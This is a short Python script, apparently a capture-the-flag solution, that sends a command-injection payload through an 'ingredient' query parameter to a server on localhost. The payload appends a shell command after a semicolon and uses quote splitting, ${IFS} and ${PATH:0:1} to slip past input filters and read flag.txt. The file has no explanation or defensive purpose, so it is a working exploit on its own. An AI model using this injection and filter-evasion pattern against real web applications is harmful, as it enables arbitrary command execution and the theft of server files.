import requests

url = "http://localhost:8000/?ingredient="
payload = ";c'a't${IFS}${PATH:0:1}flag.txt"

response = requests.get(url + payload)
if response.status_code == 200:
    print("Response from server:")
    print(response.text)
